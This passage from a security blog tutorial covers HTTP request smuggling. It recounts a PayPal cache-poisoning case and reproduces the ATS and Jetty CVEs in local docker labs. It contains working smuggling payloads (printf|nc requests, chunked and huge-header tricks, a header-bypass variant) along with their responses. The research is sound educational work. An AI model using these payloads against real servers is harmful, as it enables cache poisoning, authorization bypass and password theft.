c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 61 </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /webstatic HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: skeletonscribe.net?</span><br><span class="line"><span class="hljs-attribute">X</span>: XGET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1 </span><br><span class="line"><span class="hljs-attribute">Host</span>: c.paypal.com</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="hljs-number">302</span> Found</span><br><span class="line"><span class="hljs-attribute">Location</span>: http://skeletonscribe.net?, c.paypal.com/webstatic/</span><br></pre></td></tr></tbody></table></figure><p></p><p>But the Paypal login page has a CSP rule <code>script-src</code> which block this redirect.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg" alt=""></p><p>Later, the author noticed that the login page loads a sub-page on c.paypal.com in a dynamically generated iframe. This sub-page didn’t use CSP and also used a js file poisoned by the author! Although this can control the iframe page, because of the same-origin policy, the data of the parent page cannot be read.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg" alt=""></p><p>His colleague then discovered a page at paypal.com/us/gifts that didn’t use CSP, and also imported his poisoned JS file. By using his JS to redirect the c.paypal.com iframe to that URL (and triggering our JS import for the third time) he could finally access the parent and steal plaintext PayPal passwords from everyone who logged in using Safari or IE.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@masterhttps://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg" alt=""></p><p>Paypal’s first fix was to modify the Akamai configuration to reject requests containing <code>Transfer-Encoding: chunked</code>. But the author bypassed it quikly by constructing a newline header.</p><p></p><figure class="highlight fortran hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">Transfer</span>-Encoding:</span><br><span class="line"> chunked</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="ATS"><a href="#ATS" class="headerlink" title="ATS"></a>ATS</h2><blockquote><p>​    Apache Traffic Server (ATS) is an efficient, scalable HTTP proxy and cache server for the Apache Software Foundation.</p><p>There are multiple HTTP smuggling and cache poisoning issues when clients making malicious requests interact with Apache Traffic Server (ATS). This affects versions 6.0.0 to 6.2.2 and 7.0.0 to 7.1.3.</p><p>In NVD, we can find four patches for this vulnerability, so let’s take a closer look.</p><p>CVE-2018-8004 Patch list:</p><p><a href="https://github.com/apache/trafficserver/pull/3192" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3192</a></p><p><a href="https://github.com/apache/trafficserver/pull/3201" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3201</a> </p><p><a href="https://github.com/apache/trafficserver/pull/3231" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3231</a></p><p><a href="https://github.com/apache/trafficserver/pull/3251" target="_blank" rel="noopener">https://github.com/apache/trafficserver/pull/3251</a></p><p>Note: Although the vulnerability notification describes the scope of the vulnerability to version 7.1.3, from the version of the patch archive on github, most of the vulnerabilities have been fixed in version 7.1.3.</p></blockquote><p>About the analysis and recurrence of these four patches, I think @mengchen has already written very detailed, I will not repeat to talk about them. It is recommended to read the original part <a href="https://paper.seebug.org/1049/#4-http-smuggling-attack-examplecve-2018-8004" target="_blank" rel="noopener">HTTP Smuggling Attack Example——CVE-2018-8004</a>.</p><p>Here we talk about the part that is not in the original text.</p><p></p><figure class="highlight gherkin hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[dummy-host7.example.com]</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                    +-[8080]-----+</span></span><br><span class="line"><span class="hljs-string">                    </span>|<span class="hljs-string"> 8007-&gt;8080 </span>|</span><br><span class="line">                    |<span class="hljs-string">  ATS7      </span>|</span><br><span class="line">                    |<span class="hljs-string">            </span>|</span><br><span class="line">                    +-----+------+</span><br><span class="line">                          |</span><br><span class="line"><span class="hljs-string">                          </span>|</span><br><span class="line">                    +--[80]----+</span><br><span class="line">                    |<span class="hljs-string"> 8002-&gt;80 </span>|</span><br><span class="line">                    |<span class="hljs-string">  Nginx   </span>|</span><br><span class="line">                    |<span class="hljs-string">          </span>|</span><br><span class="line">                    +----------+</span><br></pre></td></tr></tbody></table></figure><p></p><p>We build the above scenario, and we can use the docker experimental environment I built. Here is <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/lab1" target="_blank" rel="noopener">lab1</a></p><h3 id="Request-Splitting-using-Huge-Header"><a href="#Request-Splitting-using-Huge-Header" class="headerlink" title="Request Splitting using Huge Header"></a>Request Splitting using Huge Header</h3><p>We can experiment by using a header of 65535 characters.For example, we can send a request which have got a header of 65535 characters to ATS 7 by using the following code.</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET_/something.html?zorg2=5_HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Host:_dummy-host7.example.com\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'X:_"%65534s"\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'GET_http://dummy-host7.example.com/index.html?replaced=0&amp;cache=8_HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'\r\n'</span>\</span><br><span class="line">|tr <span class="hljs-string">" "</span> <span class="hljs-string">"1"</span>\</span><br><span class="line">|tr <span class="hljs-string">"_"</span> <span class="hljs-string">" "</span>\</span><br><span class="line">|nc -q 1 127.0.0.1 8007</span><br></pre></td></tr></tbody></table></figure><p></p><p>Nginx will directly return a 400 code error, but it is more interesting with ATS 7. We will get a 400 response and a 200 response from ATS 7.</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> Invalid HTTP Request</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: no-store</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Language</span>: en</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 220</span><br><span class="line"></span><br><span class="line">&lt;HTML&gt;</span><br><span class="line">&lt;HEAD&gt;</span><br><span class="line">&lt;TITLE&gt;Bad Request&lt;/TITLE&gt;</span><br><span class="line">&lt;/HEAD&gt;</span><br><span class="line"></span><br><span class="line">&lt;BODY BGCOLOR="white" FGCOLOR="black"&gt;</span><br><span class="line">&lt;H1&gt;Bad Request&lt;/H1&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line"></span><br><span class="line">&lt;FONT FACE="Helvetica,Arial"&gt;&lt;B&gt;</span><br><span class="line"><span class="hljs-attribute">Description</span>: Could not process this request.</span><br><span class="line">&lt;/B&gt;&lt;/FONT&gt;</span><br><span class="line">&lt;HR&gt;</span><br><span class="line">&lt;/BODY&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">200</span> OK</span><br><span class="line"><span class="hljs-attribute">Server</span>: ATS/7.1.1</span><br><span class="line"><span class="hljs-attribute">Date</span>: Fri, 29 Nov 2019 18:52:42 GMT</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 119</span><br><span class="line"><span class="hljs-attribute">Last-Modified</span>: Fri, 29 Nov 2019 05:37:09 GMT</span><br><span class="line"><span class="hljs-attribute">ETag</span>: "5de0ae85-77"</span><br><span class="line"><span class="hljs-attribute">X-Location-echo</span>: /index.html?replaced=0&amp;cache=8</span><br><span class="line"><span class="hljs-attribute">X-Default-VH</span>: 0</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: public, max-age=300</span><br><span class="line"><span class="hljs-attribute">Accept-Ranges</span>: bytes</span><br><span class="line"><span class="hljs-attribute">Age</span>: 0</span><br><span class="line"><span class="hljs-attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Nginx default static page&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;It works!&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h2><p>Jetty has three CVEs related to HTTP Smuggling.</p><ul><li><p>CVE-2017-7656 HTTP/0.9 issue</p><blockquote><pre><code>In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), HTTP/0.9 is handled poorly. An HTTP/1 style request line (i.e. method space URI space version) that declares a version of HTTP/0.9 was accepted and treated as a 0.9 request. If deployed behind an intermediary that also accepted and passed through the 0.9 version (but did not act on it), then the response sent could be interpreted by the intermediary as HTTP/1 headers. This could be used to poison the cache if the server allowed the origin client to generate arbitrary content in the response.</code></pre></blockquote></li><li><p>CVE-2017-7657  Chunk size attribute truncation</p><blockquote><pre><code>In Eclipse Jetty, versions 9.2.x and older, 9.3.x (all configurations), and 9.4.x (non-default configuration with RFC2616 compliance enabled), transfer-encoding chunks are handled poorly. The chunk length parsing was vulnerable to an integer overflow. Thus a large chunk size could be interpreted as a smaller chunk size and content sent as chunk body could be interpreted as a pipelined request. If Jetty was deployed behind an intermediary that imposed some authorization and that intermediary allowed arbitrarily large chunks to be passed on unchanged, then this flaw could be used to bypass the authorization imposed by the intermediary as the fake pipelined request would not be interpreted by the intermediary as a request.</code></pre></blockquote></li><li><p>CVE-2017-7658 Double Content-Length</p><blockquote><pre><code>In Eclipse Jetty Server, versions 9.2.x and older, 9.3.x (all non HTTP/1.x configurations), and 9.4.x (all HTTP/1.x configurations), when presented with two content-lengths headers, Jetty ignored the second. When presented with a content-length and a chunked encoding header, the content-length was ignored (as per RFC 2616). If an intermediary decided on the shorter length, but still passed on the longer body, then body content could be interpreted by Jetty as a pipelined request. If the intermediary was imposing authorization, the fake pipelined request would bypass that authorization.</code></pre></blockquote></li></ul><p>For CVE-2017-7658, we will not explore it anymore, because as mentioned before, we mainly talk about the other two more interesting places.</p><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>Environment can still use what I built <a href="https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/jetty" target="_blank" rel="noopener">jetty lab enviroment</a>. Then we send a standard HTTP / 0.9 request as follows.</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET /?test=4564\r\n'</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></tbody></table></figure><p></p><p>We will get a 400 code response.</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">400</span> HTTP/0.9 not supported</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/html;charset=iso-8859-1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 65</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Server</span>: Jetty(9.4.9.v20180320)</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: HTTP/0.9 not supported&lt;/pre&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p>We add the version identifier.</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'GET /?test=4564 HTTP/0.9\r\n\r\n'</span>|nc -q 1 127.0.0.1 8994</span><br></pre></td></tr></tbody></table></figure><p></p><p>Although this is a format that is not supported by HTTP/0.9, there are unexpected gains, with a 200 response.</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Sample "Hello, World" Application<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">bgcolor</span>=<span class="hljs-string">white</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">"0"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p></p><p>No headers, only body. This request was parsed by HTTP/0.9. </p><p>What’s more interesting is that adding headers not supported by HTTP/0.9 will have unexpected results. Here we add a header that extracts the content of the response packet.</p><p></p><figure class="highlight tex hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf 'GET /?test=4564 HTTP/0.9<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>'<span class="hljs-tag">\</span></span><br><span class="line">'Range: bytes=36-42<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>'<span class="hljs-tag">\</span></span><br><span class="line">'<span class="hljs-tag">\<span class="hljs-name">r</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>'<span class="hljs-tag">\</span></span><br><span class="line">|nc -q 1 127.0.0.1 8994</span><br><span class="line"></span><br><span class="line">, World</span><br></pre></td></tr></tbody></table></figure><p></p><p>We will find that the body content has been extracted by us. Combined with the HTTP Response Splitting in HTTP Version part mentioned above, we can perform various fancy attacks.</p><h3 id="Chunk-size-attribute-truncation"><a href="#Chunk-size-attribute-truncation" class="headerlink" title="Chunk size attribute truncation"></a>Chunk size attribute truncation</h3><p>We send the request with the following code.</p><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">'POST /?test=4973 HTTP/1.1\r\n'</span>\</span><br><span class="line"><span class="hljs-string">'Transfer-Encoding: chunked\r\n'</span>\</span><br><span class="line"><span 